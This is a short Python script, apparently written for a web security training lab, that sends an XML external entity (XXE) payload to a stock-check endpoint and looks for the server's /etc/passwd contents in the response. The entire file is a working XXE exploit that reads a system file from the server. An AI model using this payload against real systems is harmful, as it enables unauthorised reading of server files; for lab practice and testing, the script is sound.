import requests

def check_xxe_vulnerability(url):
    # The XML payload attempting to define and use an external entity to read /etc/passwd
    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <stockCheck><productId>&xxe;</productId></stockCheck>"""

    headers = {
        'Content-Type': 'application/xml'  # Assuming XML is expected by the server
    }

    try:
        # Sending the crafted XML payload to the server
        response = requests.post(url, data=xml_payload, headers=headers, timeout=10)
        
        # Check if the response contains any part of the /etc/passwd file
        if "root:x:" in response.text:
            print("Vulnerable to XXE! /etc/passwd contents found in the response.")
        else:
            print("No obvious vulnerability found.")
    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")

# Replace with the URL where you are supposed to send the XML data
url = "https://0a100079035dc02d83d764a9005d000a.web-security-academy.net/product/stock"

check_xxe_vulnerability(url)
